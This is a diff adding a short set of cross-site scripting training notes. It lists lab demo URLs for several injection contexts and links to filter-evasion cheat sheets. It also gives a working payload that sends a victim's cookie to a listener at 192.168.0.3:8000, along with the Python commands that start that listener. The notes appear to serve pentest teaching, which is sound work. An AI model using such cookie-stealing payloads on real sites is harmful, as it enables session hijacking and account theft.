@@ -1,0 +1,45 @@
+XSS Primer-------------------------------------------------------------------
+
+
+Links: http://jsfiddle.net/
+
+
+Demo 01 (XSS Example) = http://www.live.bbc.co.uk/corporate2/privacy?source_tld=
+
+Demo 02 (DOM XSS) = http://pentesteracademylab.appspot.com/lab/webapp/jfp/dom?statement=80+80
+
+Demo 03 (HTML Conext) = https://public-firing-range.appspot.com/reflected/parameter/head?q=a
+
+Demo 04 (attribute 1) = http://pentesteracademylab.appspot.com/lab/webapp/htmli/1?email=&password=
+
+Demo 05 (attribute 2) = https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value?q=
+
+Demo 05 (Script context) =  https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string?q=a
+
+Demo 06 (URL Context) = http://public-firing-range.appspot.com/reflected/url/href?q=
+
+Demo 07 (Style Context) = https://public-firing-range.appspot.com/reflected/parameter/css_style?q=body{xss:expression%28alert%281%29%29}
+The above only works in IE
+
+Demo 08 (Example of a WAF = http://waf.ptest.cudasvc.com/cgi-mod/index.cgi
+
+Filter Evasion Links--------------------------
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+http://codev587.net/xss-filter-evasion-cheat-sheet-no1.html
+http://n0p.net/penguicon/php_app_sec/mirror/xss.html
+
+
+Demo 09 = http://jsfiddle.net/vh4em6o2/
+
+Demo 10 (Need to download vms first)
+
+Attack Payload = <script>var i = new Image();i.src="http://192.168.0.3:8000/gimmie.html?cookie="+document.cookie</script>
+
+Listener
+
+If Python2, then = python –m SimpleHTTPServer 8000
+If Python3, then = python -m http.server  8000
+
+More cool XSS payloads:http://www.xss-payloads.com/
+
+
